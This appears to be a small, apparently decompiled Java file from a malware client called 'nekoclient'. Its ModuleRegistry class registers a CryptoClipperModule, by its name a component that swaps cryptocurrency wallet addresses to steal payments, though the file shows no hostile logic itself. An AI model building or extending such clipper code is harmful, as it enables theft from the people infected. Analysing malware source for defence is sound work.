package dev.neko.nekoclient.module;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.module.impl.CryptoClipperModule;
import dev.neko.nekoclient.structure.Registry;
import java.util.Objects;

public class ModuleRegistry extends Registry<Module> {
   public ModuleRegistry(Client client) {
      this.register(new Module[]{new CryptoClipperModule(client)});
   }

   public final Module getByName(String name) {
      return this.getBy(module -> Objects.equals(module.getName(), name));
   }
}
